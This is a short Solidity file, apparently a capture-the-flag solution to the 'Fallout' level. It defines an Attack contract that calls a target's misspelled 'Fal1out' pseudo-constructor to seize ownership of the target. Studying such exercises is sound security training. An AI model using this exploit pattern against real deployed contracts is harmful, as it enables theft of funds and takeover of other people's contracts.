// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallout {
    function allocate() external payable;
    function Fal1out() external payable;
    function sendAllocation(address payable allocator) external;
    function collectAllocations() external;
    function allocatorBalance(address allocator) external view returns (uint);
}

contract Attack {
    IFallout public target;

    constructor(address _target) {
        target = IFallout(_target);
    }

    function attack() public payable {
        target.Fal1out{ value: 0.0001 ether}();
    }
}